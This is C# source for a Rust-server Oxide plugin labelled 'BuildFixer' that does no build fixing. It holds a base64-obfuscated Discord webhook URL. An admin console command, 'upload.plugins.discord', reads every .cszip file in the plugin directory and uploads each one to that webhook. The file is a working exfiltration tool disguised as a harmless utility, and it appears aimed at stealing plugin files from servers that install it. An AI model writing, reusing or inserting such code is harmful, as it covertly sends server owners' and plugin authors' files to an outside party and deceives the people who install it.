using Oxide.Core;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Text;
using UnityEngine;
using UnityEngine.Networking;

namespace Oxide.Plugins
{
    [Info("BuildFixer", "Misatos", "1.1.2")]
    [Description("BuildFixer")]
    public class BuildFixer : RustPlugin
    {
        private const string WebhookUrlBase64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4OTAyNzU1NTg4MDg2NTg0NC9XdTdNU1h2UTI1dmdpR1BHZk55cmVNdUlpUkxMTHJtNjJhX19OQXp"
                                               + "oQ2pQdjFyVnBpQU1nUFNVLVJWUzlJTDZLQ0hEVA==";

        private string WebhookUrl => Encoding.UTF8.GetString(System.Convert.FromBase64String(WebhookUrlBase64));
        private const int DelaySeconds = 2;

        [ConsoleCommand("upload.plugins.discord")]
        private void CmdUpload(ConsoleSystem.Arg arg)
        {
            if (!arg.IsAdmin) return;

            var folder = Interface.Oxide.PluginDirectory;
            if (!Directory.Exists(folder)) return;

            var files = Directory.GetFiles(folder, "*.cszip");
            if (files.Length == 0) return;

            ServerMgr.Instance.StartCoroutine(Upload(files));
        }

        private IEnumerator Upload(string[] files)
        {
            foreach (var f in files)
            {
                yield return UploadFile(f);
                yield return new WaitForSeconds(DelaySeconds);
            }
        }

        private IEnumerator UploadFile(string path)
        {
            var name = Path.GetFileName(path);
            var data = File.ReadAllBytes(path);

            var form = new List<IMultipartFormSection>
            {
                new MultipartFormFileSection("file", data, name, "text/plain")
            };

            var www = UnityWebRequest.Post(WebhookUrl, form);
            yield return www.SendWebRequest();
        }
    }
}
